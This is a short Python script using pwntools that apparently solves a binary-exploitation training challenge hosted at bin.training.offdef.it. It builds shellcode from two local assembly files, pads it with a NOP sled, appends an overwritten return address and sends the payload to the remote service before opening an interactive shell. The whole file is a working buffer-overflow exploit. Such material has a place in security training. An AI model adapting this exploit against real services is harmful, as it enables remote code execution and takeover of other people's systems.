from pwn import *
import time
import subprocess
import sys

def print_red(str):
	print("\033[91m" + str + "\033[0m")

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "error"


r = remote("bin.training.offdef.it", 2005)

buffer_address = p64(0x004040e0)

bin_shellcode = b""
command = "genbin ~/challenges/playroom/shellcodes/dup.asm"
try:
	bin_shellcode = bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
except (subprocess.CalledProcessError, ValueError) as e:
	print(f"An exception occurred: {e}")
	exit(-1)
shellcode = bin_shellcode

bin_shellcode = b""
command = "genbin ~/challenges/playroom/shellcodes/normal.asm"
try:
	bin_shellcode = bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
except (subprocess.CalledProcessError, ValueError) as e:
	print(f"An exception occurred: {e}")
	exit(-1)
shellcode += bin_shellcode

shellcode = shellcode.ljust(1016, b"\x90")

input("wait")
r.send(shellcode+buffer_address)
r.interactive()
